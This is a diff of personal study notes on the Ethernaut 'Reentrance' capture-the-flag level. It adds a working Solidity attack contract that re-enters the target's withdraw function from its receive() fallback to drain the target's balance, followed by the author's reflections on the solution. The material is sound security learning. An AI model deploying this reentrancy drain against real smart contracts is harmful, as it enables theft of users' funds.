@@ -9,3 +9,36 @@ updated yet!)
 so we want to enter both if blocks, and somehow fall over inside
 the inner if block (because its between transfer and accounting)
 
+can we pass a null / non bool as result?
+
+------
+ That idea didn't work, but using a fallback function in the
+ withdrawinig address did. However, my solution didn't work:
+
+contract Attack {
+    Reentrance reentrance;
+    uint deposit;
+    
+    constructor(address _reentrance) payable {
+        reentrance = Reentrance(payable(_reentrance));
+        deposit = address(this).balance;
+        reentrance.donate{value: deposit}(address(this));
+        reentrance.withdraw(deposit);
+    }
+    
+    receive() external payable {
+        uint fundsToSteal = address(reentrance).balance;
+        if (fundsToSteal > 0) {
+            reentrance.withdraw(fundsToSteal > deposit
+                ? deposit : fundsToSteal);
+        }
+    }
+}
+
+I had to put the withdrawal if logic inside a private function,
+not sure why? Need to look into this (could be gas?)
+
+credit: https://cmichel.io/ethernaut-solutions/ 
+
+Spoke with Chris and he says I shouldn't have put all that logic
+in the constructor - makes sense!
